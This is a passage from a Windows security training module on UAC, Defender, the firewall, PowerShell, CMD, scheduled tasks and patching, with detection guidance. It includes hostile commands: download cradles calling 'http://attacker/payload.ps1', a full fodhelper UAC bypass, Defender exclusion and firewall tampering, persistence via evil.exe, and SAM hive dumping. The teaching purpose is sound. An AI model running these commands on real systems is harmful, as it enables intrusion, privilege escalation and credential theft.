Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions

# Enable aggressive ASR rules (Audit mode first, then Block)
Set-MpPreference -AttackSurfaceReductionRules_Ids <GUID> -AttackSurfaceReductionRules_Actions AuditMode
```

### 7.3 Exclusions — The Defender Achilles Heel

Defender exclusions are configured paths, processes, or file types that Defender will not scan. They are a necessary feature for performance in some environments but are routinely abused:

```powershell
# Check existing exclusions — attackers check this during post-exploitation
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension

# Common attack technique: Add an exclusion for your malware's location
Set-MpPreference -ExclusionPath "C:\Users\Public\Tools"
# Now anything in that path will not be scanned
```

**Real-world abuse:** Many legitimate software products add broad exclusions during installation for performance reasons. Attackers identify these exclusions and place their malware in the excluded paths. Regularly auditing Defender exclusions is an important hardening step.

---

## 8. UAC — User Account Control

### 8.1 What UAC Is and Why It Exists

UAC (User Account Control) was introduced in Windows Vista to address a fundamental problem: users were routinely running as local Administrators, meaning every application they ran — including malware — had full administrative privileges.

UAC implements the **principle of least privilege** for interactive users by creating two tokens at logon time:
1. A **filtered token** with administrative privileges removed — used for normal operations
2. A **full administrator token** — used only when explicitly elevated

```
Admin user logs in:
    ├── Filtered Token (Medium integrity) → used for explorer.exe, applications
    └── Full Token (High integrity) → used only after UAC prompt consent
```

This means even a local Administrator runs at Medium integrity level day-to-day and must explicitly consent to elevation.

### 8.2 UAC Elevation Flow

```
User double-clicks installer.exe
        ↓
Windows checks: does this need admin? (manifest, installer heuristics)
        ↓
UAC prompt displayed on Secure Desktop
(Secure Desktop: a separate desktop that user apps cannot interact with)
        ↓
User clicks Yes (or provides credentials if standard user)
        ↓
New elevated process created with High integrity token
```

The **Secure Desktop** is crucial — it prevents malware from programmatically clicking "Yes" on the UAC prompt by running the prompt on a separate desktop that only the kernel can draw on.

### 8.3 UAC Settings and Their Security Implications

```
Always notify (most secure)
    → Prompt for ALL changes, on secure desktop

Notify only when apps try to make changes (default)
    → Prompt for app changes on secure desktop
    → No prompt for Windows settings changes

Notify but not on secure desktop
    → Prompt displayed on normal desktop
    → Malware CAN spoof this by drawing over it or sending programmatic clicks

Never notify (worst)
    → UAC completely disabled
    → All processes run with full admin token
    → Equivalent to pre-Vista security model
```

```powershell
# Check current UAC setting
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" |
    Select-Object EnableLUA, ConsentPromptBehaviorAdmin, PromptOnSecureDesktop
# EnableLUA = 1 means UAC is enabled
# ConsentPromptBehaviorAdmin: 2=prompt for credentials, 5=prompt for consent (default)
# PromptOnSecureDesktop: 1=secure desktop (default), 0=normal desktop (insecure)
```

### 8.4 UAC Bypass Techniques

UAC is not a security boundary — Microsoft explicitly states this. It is a convenience feature. A determined attacker with code execution as a standard admin can bypass UAC.

**Auto-elevation — The Design Quirk:**
Some Windows executables are explicitly marked to auto-elevate without a UAC prompt. These are signed Microsoft executables in trusted locations. If an attacker can make one of these auto-elevating executables load their malicious code, they get elevation without a prompt.

**DLL Hijacking for UAC Bypass:**
```
1. Find an auto-elevating executable that loads a DLL from a user-writable location
2. Place malicious DLL in that location
3. Trigger the auto-elevating executable
4. DLL loads with elevated privileges, no UAC prompt
```

Examples of historic UAC bypasses using this technique:
- **eventvwr.exe bypass** — eventvwr.exe auto-elevates and reads a registry key the user controls; attacker redirects it to launch a custom executable
- **fodhelper.exe bypass** — fodhelper.exe reads shell open commands from HKCU (user-writable) and launches them elevated
- **sdclt.exe bypass** — similar mechanism

```powershell
# fodhelper UAC bypass (educational, common in CTFs and real pentest assessments)
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(Default)" -Value "cmd.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
# Result: cmd.exe opens with High integrity (elevated) without UAC prompt
# Cleanup:
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

> **Key Mindset:** UAC bypass techniques are some of the most commonly tested in CTFs and OSCP-style exams. Understanding WHY they work (auto-elevation + user-writable registry/file paths) is more important than memorising specific techniques, because new bypasses are discovered regularly.

---

## 9. Windows Firewall

### 9.1 Windows Firewall Architecture

Windows Firewall (officially **Windows Defender Firewall with Advanced Security**) is a host-based, stateful firewall built into Windows. Unlike network perimeter firewalls, it runs on the endpoint itself.

```
Inbound Traffic → [Network Interface] → Windows Filtering Platform (WFP)
                                              ↓
                                    [Firewall Rules Engine]
                                              ↓
                               Allow? → Application receives data
                               Block? → Traffic dropped, optionally logged
```

**Windows Filtering Platform (WFP):**
WFP is the kernel-mode architecture underlying Windows Firewall and all third-party firewall/VPN/network security products on Windows. Any product that filters network traffic on Windows uses WFP callout drivers. Understanding WFP is essential for understanding how Windows network security products work — and how they can be bypassed.

### 9.2 Profiles

Windows Firewall operates with three network profiles applied based on the detected network type:

| Profile | Applied When | Default Posture |
|---------|-------------|-----------------|
| **Domain** | Machine joined to a domain and domain controller detected | More permissive (managed environment) |
| **Private** | Home or trusted network | Moderate |
| **Public** | Untrusted network (coffee shop, airport) | Most restrictive |

```powershell
# Check firewall status for all profiles
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction

# Enable/Disable (use carefully)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

### 9.3 Firewall Rules

```powershell
# List all enabled inbound rules
Get-NetFirewallRule -Direction Inbound -Enabled True |
    Select-Object DisplayName, Action, Profile |
    Sort-Object DisplayName

# Find rules that allow inbound connections
Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True |
    Select-Object DisplayName, Profile

# Find rules for a specific port
Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} |
    Get-NetFirewallPortFilter | Where-Object {$_.LocalPort -eq '3389'} |
    ForEach-Object {Get-NetFirewallRule -AssociatedNetFirewallPortFilter $_} |
    Select-Object DisplayName, Direction, Action

# Create a rule (example: allow RDP from specific IP only)
New-NetFirewallRule -DisplayName "Allow RDP from Management" `
    -Direction Inbound `
    -Protocol TCP `
    -LocalPort 3389 `
    -RemoteAddress 192.168.1.100 `
    -Action Allow
```

### 9.4 Firewall Evasion and Manipulation

**Attackers routinely disable or modify Windows Firewall during post-exploitation:**

```cmd
# Disable firewall completely (requires admin)
netsh advfirewall set allprofiles state off

# Add a rule to allow a specific port (C2 communication)
netsh advfirewall firewall add rule name="Windows Update" dir=in action=allow protocol=TCP localport=4444

# Open a port for a specific program
netsh advfirewall firewall add rule name="Updater" dir=in action=allow program="C:\malware.exe"
```

**Detection:** These commands generate Windows Event Log entries:
- **Event ID 2004** (Security) — Rule added to Windows Firewall
- **Event ID 2005** (Security) — Rule modified
- **Event ID 2006** (Security) — Rule deleted
- **Event ID 2033** (Security) — All rules deleted

**Windows Firewall Bypass via Allowed Applications:**
Every application that you install that needs inbound connections adds a firewall exception. Malware often adds itself using the name of a legitimate application:

```cmd
netsh advfirewall firewall add rule name="Google Chrome" dir=in action=allow program="C:\Users\user\AppData\Local\evil.exe"
```

---

## 10. PowerShell Fundamentals

### 10.1 Why PowerShell Matters More Than Anything Else in Windows Security

PowerShell is not just a scripting language. It is the most powerful administration interface in Windows, providing direct access to .NET, COM objects, WMI, the registry, Active Directory, and virtually every Windows subsystem. It is the preferred tool of both administrators and attackers.

**The "Living off the Land" reality:** Attackers prefer PowerShell because:
1. It is present on every modern Windows system
2. It can be used without writing files to disk (in-memory execution)
3. It can download and execute payloads directly from the internet
4. It has deep access to every Windows subsystem
5. Historically it could evade antivirus tools

### 10.2 PowerShell Execution Policy

Execution policy controls whether PowerShell will run scripts. It is commonly misunderstood as a security feature — it is not. It is an administrative guardrail.

```powershell
# Check current execution policy
Get-ExecutionPolicy -List

# Policies (least to most restrictive):
# Unrestricted  — Run anything
# Bypass        — Nothing is blocked, no warnings
# RemoteSigned  — Local scripts OK, downloaded scripts need signature
# AllSigned     — All scripts must be signed
# Restricted    — No scripts allowed (default on consumer Windows)
# Undefined     — No policy set for this scope

# Bypass execution policy (does NOT require admin — this is by design)
powershell.exe -ExecutionPolicy Bypass -File script.ps1
powershell.exe -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"

# Execution policy is not a security control
# It can be bypassed in at least 15 different ways
```

### 10.3 Core PowerShell Concepts for Security Work

**Pipeline — The Fundamental Design:**
```powershell
# PowerShell passes objects through the pipeline, not text
# This is fundamentally different from bash
Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU -Descending | Select-Object Name, CPU, Id

# Each stage receives full .NET objects, not strings
# This makes filtering and manipulation far more powerful and accurate than bash text parsing
```

**Essential Cmdlets for Security Work:**
```powershell
# Process and service investigation
Get-Process
Get-Service
Get-WmiObject Win32_Process  # More details than Get-Process

# Network investigation
Get-NetTCPConnection          # Active TCP connections
Get-NetUDPEndpoint            # UDP endpoints
Test-NetConnection -ComputerName target -Port 445  # Port test

# File system
Get-ChildItem -Path C:\ -Recurse -Force  # List everything including hidden
Get-Item -Path "HKLM:\SOFTWARE\..." -ErrorAction SilentlyContinue  # Registry
Get-Content C:\file.txt        # Read file
Get-FileHash C:\file.exe -Algorithm SHA256  # Hash a file

# User and group
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
whoami /all  # Current user, groups, and privileges

# Event logs
Get-WinEvent -LogName Security -MaxEvents 100
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624; StartTime=(Get-Date).AddDays(-1)}

# Active Directory (if RSAT installed or on DC)
Get-ADUser -Filter * -Properties *
Get-ADGroupMember -Identity "Domain Admins"
Get-ADComputer -Filter * -Properties *
```

### 10.4 PowerShell for Offensive Operations — Understanding the Threat

Understanding how PowerShell is weaponised is essential for both attackers (in authorised pentests) and defenders (to build detections):

**Download Cradles — The Most Common Technique:**
```powershell
# Download and execute in memory (no file written to disk)
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

# Using Invoke-RestMethod
IEX (Invoke-RestMethod 'http://attacker/payload.ps1')

# Using certutil to download (LOLBin)
certutil -urlcache -split -f http://attacker/payload.exe C:\temp\payload.exe

# Using bitsadmin (LOLBin)
bitsadmin /transfer job http://attacker/payload.exe C:\temp\payload.exe
```

**Encoded Commands — Obfuscation:**
```powershell
# Attackers encode payloads to evade signature detection
$command = 'Write-Host "Executed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded

# Defenders decode these for analysis:
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
```

### 10.5 PowerShell Logging — The Defender's Best Friend

Three levels of PowerShell logging are critical for security operations:

**1. Module Logging (Event ID 4103):**
Logs all pipeline execution and output. Very verbose.

**2. Script Block Logging (Event ID 4104):**
Logs the actual content of every script block executed — including deobfuscated content. This is why AMSI bypass attempts and encoded commands still get detected — PowerShell logs the decoded content before execution.

```powershell
# Enable script block logging via registry
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -Name EnableScriptBlockLogging -Value 1 -Force

# Log location: Microsoft-Windows-PowerShell/Operational (Event ID 4104)
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Id -eq 4104} |
    Select-Object TimeCreated, Message |
    Format-List
```

**3. Transcription Logging:**
Logs all input and output to a text file — like a complete session recording.

```powershell
# Enable transcription via policy
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name EnableTranscripting -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -Name OutputDirectory -Value "C:\PSTranscripts" -Force
```

> **Professional Note:** Enabling Script Block Logging should be one of the first steps in any Windows security hardening programme. It dramatically increases visibility into PowerShell-based attacks. Combined with a SIEM or log aggregation solution, it enables detection of most PowerShell-based attack techniques.

---

## 11. CMD — Core Commands

### 11.1 CMD vs PowerShell

CMD (Command Prompt, `cmd.exe`) is the legacy Windows command interpreter. It predates PowerShell and is significantly less powerful, but it remains important because:

- Available on all Windows versions including legacy systems common in OT environments
- Simpler and faster for basic tasks
- Many malware scripts still use CMD
- Log analysis sometimes reveals CMD commands used by attackers
- Some tools and situations still require CMD

### 11.2 Essential CMD Commands for Security Work

**System Reconnaissance:**
```cmd
:: System information
systeminfo
hostname
whoami
whoami /all         :: User, groups, and privileges
ipconfig /all       :: Network configuration
net user            :: List local users
net localgroup      :: List local groups
net localgroup Administrators  :: Who is in Administrators?

:: Process and network
tasklist /v         :: Process list with details
tasklist /svc       :: Services hosted in each process
netstat -ano        :: Active connections with PID
netstat -b          :: Which process owns each connection (requires admin)

:: Environment
set                 :: All environment variables
echo %PATH%
echo %COMPUTERNAME%
echo %USERNAME%
echo %USERDOMAIN%
```

**File System:**
```cmd
:: Directory listing
dir /a /s C:\interesting_directory  :: All files including hidden, recursive
dir /r                              :: Show alternate data streams
type file.txt                       :: Read file
more file.txt                       :: Read file page by page

:: Find files
where /r C:\ *.ps1     :: Find all PowerShell scripts
where /r C:\ passwords.txt

:: File operations
copy source.txt dest.txt
move source.txt dest.txt
del file.txt
rmdir /s /q directory
```

**Networking:**
```cmd
:: Network connectivity
ping target_ip
ping -n 1 -w 1000 192.168.1.1   :: Quick ping (1 packet, 1 second timeout)
tracert target_ip

:: DNS
nslookup domain.com
nslookup -type=MX domain.com
nslookup -type=TXT domain.com

:: ARP cache (local network discovery)
arp -a

:: Routing
route print

:: Remote connectivity test
telnet target_ip port             :: Test if port is open (if telnet is installed)
```

**Registry:**
```cmd
:: Query registry
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query HKLM /f password /t REG_SZ /s  :: Search for "password" in all HKLM values

:: Add/modify (requires appropriate permissions)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\evil.exe" /f

:: Save and load hives
reg save HKLM\SAM C:\sam.hive
reg save HKLM\SYSTEM C:\system.hive
```

**Service and Process Management:**
```cmd
:: Services
sc query                    :: List all services
sc query type= all state= all  :: All services including stopped
sc qc ServiceName           :: Query service configuration
sc start ServiceName
sc stop ServiceName
sc create MyService binPath= "C:\service.exe" start= auto

:: Processes
taskkill /PID 1234 /F       :: Force kill by PID
taskkill /IM notepad.exe /F :: Force kill by name
```

**Scheduled Tasks:**
```cmd
:: List all scheduled tasks
schtasks /query /fo LIST /v

:: Create a task (common persistence technique)
schtasks /create /tn "Windows Update" /tr "C:\evil.exe" /sc ONLOGON /ru SYSTEM

:: Delete a task
schtasks /delete /tn "TaskName" /f
```

---

## 12. Task Scheduler

### 12.1 Task Scheduler Architecture

Task Scheduler is one of the most commonly abused persistence mechanisms in Windows. Attackers love it because:
- Tasks can run as any user, including SYSTEM
- Tasks survive reboots
- Tasks can be hidden from normal view
- Tasks can be triggered by dozens of conditions (logon, time, events, system state)
- Tasks are legitimate Windows functionality — hard to distinguish from benign tasks without investigation

### 12.2 Task Structure

Each scheduled task has:
- **Trigger** — What causes it to run (time, logon, event, idle, etc.)
- **Action** — What to execute (program, script)
- **Principal** — What account to run as
- **Conditions** — Additional constraints (only when idle, only on AC power, etc.)
- **Settings** — Run if missed, restart on failure, etc.

```xml
<!-- Example task XML structure -->
<Task>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-NonInteractive -WindowStyle Hidden -EncodedCommand BASE64PAYLOAD</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>  <!-- SYSTEM -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
</Task>
```

### 12.3 Task Scheduler as Persistence — Attack and Detection

**Creating Malicious Tasks:**
```powershell
# PowerShell — create a SYSTEM-level task that runs at logon
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand BASE64PAYLOAD"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "Microsoft Edge Update" `
    -Action $action -Trigger $trigger -Principal $principal -Force
```

**Common Attacker Tricks:**
1. **Naming tasks after legitimate software** — "Google Update," "Adobe Acrobat Update," "Microsoft Edge Update"
2. **Nesting in legitimate folders** — Tasks can be in subfolders; attackers create tasks in `\Microsoft\Windows\` to blend in
3. **COM handler hijacking via tasks** — Tasks that trigger on specific events to load malicious COM handlers
4. **Deleting the task after execution** — `OnLogon` task that runs once, delivers payload, then deletes itself

**Detection:**
```powershell
# List all tasks with full detail — look for anomalies
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $info = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Name = $task.TaskName
        Path = $task.TaskPath
        State = $task.State
        LastRun = $info.LastRunTime
        NextRun = $info.NextRunTime
        Actions = ($task.Actions | ForEach-Object {"$($_.Execute) $($_.Arguments)"}) -join " | "
        RunAs = $task.Principal.UserId
    }
} | Format-Table -Wrap

# Tasks created recently (last 7 days) — high suspicion
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4698; StartTime=(Get-Date).AddDays(-7)} |
    Select-Object TimeCreated, Message

# Tasks with suspicious action paths
Get-ScheduledTask | 
    Where-Object {$_.Actions.Execute -match "powershell|cmd|wscript|cscript|mshta|regsvr32|rundll32"} |
    Select-Object TaskName, TaskPath, @{N='Action';E={$_.Actions.Execute}}, @{N='Args';E={$_.Actions.Arguments}}
```

---

## 13. Windows Update Mechanism

### 13.1 How Windows Update Works

Windows Update is the patch delivery mechanism for Windows. Understanding it matters for security in both directions:

**As a defender:**
- Patch management is one of the most impactful security controls. A significant percentage of breaches exploit known vulnerabilities with available patches.
- Understanding the update pipeline helps you verify updates are being applied.

**As an attacker/pentester:**
- Identifying unpatched systems and their missing patches is a standard enumeration step.
- Windows Update services themselves have been attack vectors.

**Architecture:**
```
Microsoft Update Servers (update.microsoft.com)
        ↓ (WSUS can intercept this in enterprise)
WSUS (Windows Server Update Services) — enterprise update management
        ↓
Windows Update Client (wuauserv service)
        ↓
Downloaded updates staged in C:\Windows\SoftwareDistribution\Download\
        ↓
Windows Module Installer (TrustedInstaller) applies updates
        ↓
C:\Windows\WinSxS\ (Component Store) updated
        ↓
Reboot may be required
```

### 13.2 Update Components and Their Security Implications

**Windows Update Agent (wuauserv):**
The service that checks for, downloads, and installs updates. Runs as NETWORK SERVICE with some SYSTEM privileges.

**TrustedInstaller:**
The account that actually applies Windows updates. It has higher privileges than SYSTEM for modifying Windows system files. Standard SYSTEM processes cannot modify files owned by TrustedInstaller — this protects core Windows files.

```powershell
# Check update status
Get-WindowsUpdateLog  # Parses ETW update logs into readable text

# Check installed updates
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20

# Check for missing updates (requires PSWindowsUpdate module)
Install-Module PSWindowsUpdate
Get-WindowsUpdate
```

### 13.3 Windows Update Attack Surface

**WSUS HTTP — Man-in-the-Middle:**
In enterprise environments, Windows Update traffic is often routed through an internal WSUS server. If WSUS is configured to use HTTP instead of HTTPS, the update traffic can be intercepted. The **WSUSpendu** and **PyWSUS** tools demonstrated that a network-positioned attacker on an HTTP WSUS network can inject a malicious update that installs with SYSTEM privileges — no authentication bypass required, because the update mechanism trusts the WSUS server.

This is a significant OT/ICS risk: many industrial control networks use internal WSUS servers, often over HTTP, for managing patches on Windows-based HMI systems.

**SoftwareDistribution Folder:**
Downloaded update packages are stored temporarily in `C:\Windows\SoftwareDistribution\Download\`. This folder can contain sensitive information about installed software versions and pending patches. It can also be used as a staging area for malware that mimics the naming conventions of legitimate updates.

### 13.4 Patch Management for Security

```powershell
# Check which security patches are missing compared to Microsoft's catalog
# Use this in combination with vulnerability scanners

# Check the last time updates were checked/applied
(New-Object -ComObject "Microsoft.Update.AutoUpdate").Results

# Force update check
wuauclt.exe /detectnow
# Or on modern Windows:
UsoClient.exe StartScan

# Check Windows version and build for vulnerability research
[System.Environment]::OSVersion
(Get-ComputerInfo).WindowsVersion
(Get-ComputerInfo).OsHardwareAbstractionLayer
```

**For penetration testing — identifying missing patches:**
```powershell
# Get OS version and all installed hotfixes for comparison against known vulnerabilities
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"

# Cross-reference with:
# - Microsoft Security Update Guide: msrc.microsoft.com
# - NIST NVD: nvd.nist.gov
# - Exploit-DB: exploit-db.com
# Tools: windows-exploit-suggester.py, WinPEAS, Sherlock.ps1
```

---

## 14. Key Takeaways and Security Mindset

### 14.1 Windows Is a Layered System — Understand Every Layer

```
Registry          → Configuration storage, persistence mechanism
Services          → Long-running execution, privilege context
Scheduled Tasks   → Time/event-based execution, persistence
Token system      → Identity and privilege, impersonation attacks
UAC               → Privilege separation (not a security boundary)
Windows Firewall  → Network access control
Defender + AMSI   → Content inspection (bypassable but raises the bar)
Event Log         → The audit trail for everything above
PowerShell        → The administration interface (attacker's playground, defender's toolkit)
```

### 14.2 "Living off the Land" Is the Default Attack Mode

Modern attackers rarely bring their own tools. They use:
- **PowerShell** — download cradles, remote execution, credential access
- **CMD** — basic enumeration, persistence via `schtasks`, `reg`
- **WMI** — remote execution, persistence, information gathering
- **certutil, bitsadmin, mshta** — download and execute payloads
- **regsvr32, rundll32** — proxy execution of malicious code

These are **LOLBins (Living off the Land Binaries)** — legitimate Windows tools used maliciously. Your detections must account for legitimate tools used in illegitimate ways. This is why understanding context (who ran it, from what parent process, with what arguments, to what network destination) matters more than just the binary name.

### 14.3 Every Setting Is a Security Decision

Every Windows configuration option covered in this module represents a security trade-off:

- UAC disabled → convenience, security risk
- PowerShell logging disabled → performance, visibility loss
- Defender exclusions → compatibility, detection gap
- Firewall rules → functionality, attack surface
- Windows Update disabled → stability (in OT), vulnerability exposure

There is no "set and forget" secure configuration. Security is an ongoing process of auditing, adjusting, and monitoring.

### 14.4 For OT/ICS Windows Systems

- **Legacy Windows is endemic in OT.** Windows XP runs on HMIs in active production facilities today in 2025. Windows XP has no ASLR, no NX (hardware not required to support it), no UAC, no Defender, no modern event log. Every technique in this module is far easier on legacy Windows.
- **Windows Update is often disabled** in OT environments for "stability." This creates chronic unpatched vulnerability exposure.
- **PowerShell remoting** (WinRM) is sometimes enabled on OT workstations for remote management. This is an enormous attack surface in environments without proper network segmentation.
- **WSUS over HTTP** is common in OT networks — a significant vulnerability.

---

## 15. Hands-On Exercises

### Exercise 1: Registry Hunt for Persistence (45 minutes)

```powershell
# Audit all autorun locations on your machine
# Install and run Autoruns from Sysinternals first
# Then manually verify the top findings:

# 1. Check all Run keys
$runPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($path in $runPaths) {
    Write-Host "`n=== $path ===" -ForegroundColor Yellow
    Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
}

# 2. For each entry, verify:
#    - Is the binary in an expected location?
#    - Is it digitally signed?
#    - Who is the publisher?
Get-AuthenticodeSignature "C:\path\to\executable.exe" | Select-Object Status, SignerCertificate

# 3. Check services for suspicious configurations
Get-WmiObject Win32_Service |
    Where-Object {$_.StartMode -eq 'Auto' -and $_.State -eq 'Running'} |
    Select-Object Name, PathName, StartName |
    Where-Object {$_.PathName -notmatch 'System32|SysWOW64'} |
    Format-Table -Wrap
```

### Exercise 2: Event Log Security Audit (1 hour)

```powershell
# Build a mini-investigation from Event Logs

# 1. Find all logon events from the last 7 days
$logons = Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4624; StartTime=(Get-Date).AddDays(-7)
} -ErrorAction SilentlyContinue

Write-Host "Total logon events (7 days): $($logons.Count)"

# 2. Analyse logon types
$logons | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $xml.Event.EventData.Data | Where-Object {$_.Name -eq 'LogonType'} | 
        Select-Object -ExpandProperty '#text'
} | Group-Object | Sort-Object Count -Descending | 
    Format-Table -Property @{N='LogonType';E={$_.Name}}, Count

# 3. Find any suspicious process creation (4688 - requires audit policy)
Get-WinEvent -FilterHashtable @{
    LogName='Security'; Id=4688; StartTime=(Get-Date).AddDays(-1)
} -ErrorAction SilentlyContinue | 
    Select-Object TimeCreated, Message | 
    Where-Object {$_.Message -match 'powershell|cmd|wscript|cscript|mshta'} |
    Format-List

# 4. Check if log was cleared (should return nothing on a clean system)
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -ErrorAction SilentlyContinue |
    Select-Object TimeCreated, Message
```

### Exercise 3: UAC Bypass (Lab Environment Only)

**Set up a VM with a local admin account (not domain joined) before this exercise.**

```powershell
# Verify current integrity level before bypass
[System.Diagnostics.Process]::GetCurrentProcess() | ForEach-Object {
    $handle = $_.Handle
}
whoami /groups | findstr "Mandatory"
# Should show: Medium Mandatory Level

# fodhelper UAC bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(Default)" -Value "cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# In the new cmd window that opens:
whoami /groups | findstr "Mandatory"
# Should now show: High Mandatory Level — elevated without UAC prompt

# Cleanup — always clean up after testing
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### Exercise 4: PowerShell Logging Verification

```powershell
# 1. Enable Script Block Logging
$sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
New-Item -Path $sbPath -Force
New-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 1 -PropertyType DWORD -Force

# 2. Run a test script that would look suspicious
Invoke-Expression "Write-Host 'This is a test of script block logging'"
[System.Convert]::FromBase64String("VGhpcyBpcyBiYXNlNjQ=")  # Decode base64

# 3. Find the logged event
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object {$_.Id -eq 4104} |
    Select-Object -First 5 |
    Select-Object TimeCreated, Message |
    Format-List

# 4. Understand what you see — the decoded content is logged, not just the encoded form
```

### Exercise 5: Scheduled Task Analysis

```powershell
# Complete scheduled task audit
Get-ScheduledTask | ForEach-Object {
    $task = $_
    $actions = $task.Actions | ForEach-Object {
        "$($_.Execute) $($_.Arguments)"
    }
    [PSCustomObject]@{
        Name      = $task.TaskName
        Path      = $task.TaskPath
        State     = $task.State
        RunAs     = $task.Principal.UserId
        Triggers  = ($task.Triggers | ForEach-Object {$_.GetType().Name}) -join ", "
        Actions   = $actions -join " | "
    }
} | Where-Object {
    # Flag potentially suspicious tasks
    $_.Actions -match "powershell|cmd\.exe|wscript|cscript|mshta|regsvr32" -or
    $_.RunAs -match "SYSTEM|S-1-5-18"
} | Format-Table Name, Path, RunAs, Actions -Wrap
```

---

## 16. Further Reading and Resources

### Essential Reading
- **"Windows Internals" (Parts 1 & 2)** — Russinovich, Solomon, Ionescu. The definitive Windows OS reference. Heavy but essential.
- **"The Hacker Playbook 3"** — Peter Kim. Windows post-exploitation and Active Directory attacks with practical examples.
- **MITRE ATT&CK for Windows** — attack.mitre.org — map every technique in this module to real adversary TTPs.

### Microsoft Documentation
- Windows Security documentation: docs.microsoft.com/windows/security
- Windows Event IDs reference: docs.microsoft.com/windows/security/threat-protection/auditing
- Attack Surface Reduction rules: docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference

### Essential Tools
```
Sysinternals Suite (mandatory download):
https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite

Key tools:
- Autoruns      → Persistence auditing
- Process Explorer → Process investigation
- Process Monitor → Real-time file/registry/process activity
- TCPView        → Network connections to processes
- Strings        → Extract strings from binaries
- PsExec         → Remote execution (also understand as attack tool)
- AccessChk      → Permission auditing
- Sigcheck       → Verify digital signatures
```

### Practice Platforms
- **TryHackMe** — "Windows Fundamentals 1-3" (free), "Blue" room, "Advent of Cyber"
- **HackTheBox** — Windows-based machines (Easy tier for starting)
- **CyberDefenders** — Windows forensics blue team challenges
- **LetsDefend** — SOC analyst scenarios heavily focused on Windows

### Reference Sites
- **LOLBAS Project** (lolbas-project.github.io) — Living off the Land Binaries and Scripts
- **UAC Bypass Techniques** — github.com/hfiref0x/UACME — comprehensive UAC bypass collection with explanations
- **PayloadsAllTheThings** — github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

---

## Module Summary

| Topic | Core Security Application |
|-------|--------------------------|
| Windows Architecture | ntoskrnl, lsass, svchost — process impersonation, credential access |
| Registry | Persistence (Run keys), credential extraction (SAM/SYSTEM), forensic artefacts |
